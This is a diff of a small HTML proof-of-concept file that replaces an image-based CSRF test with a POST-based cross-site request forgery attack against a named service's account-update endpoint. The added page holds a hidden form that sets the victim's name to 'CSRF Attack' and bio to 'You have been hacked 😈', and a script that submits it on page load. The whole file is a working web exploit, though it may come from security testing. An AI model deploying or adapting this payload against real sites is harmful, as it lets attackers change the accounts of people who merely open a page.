@@ -1,11 +1,20 @@
-<!-- csrf-img-poc.html -->
+<!-- csrf-post-poc.html -->
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CSRF PoC via IMG</title>
+    <title>CSRF PoC - POST</title>
   </head>
   <body>
-    <h2>Testing CSRF via IMG</h2>
-    <img src="https://ladybug.a9s.toloka.ai/api/account" width="600" height="200" onerror="document.body.innerHTML += '<p>❌ CSRF Failed - 401 Unauthorized</p>';" onload="document.body.innerHTML += '<p>✅ CSRF Success - Request Allowed</p>';">
+    <h2>Trying POST CSRF</h2>
+
+    <form action="https://ladybug.a9s.toloka.ai/api/account/update" method="POST" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="fullname" value="CSRF Attack">
+      <input type="hidden" name="bio" value="You have been hacked 😈">
+      <input type="submit" value="Trigger CSRF">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
   </body>
 </html>
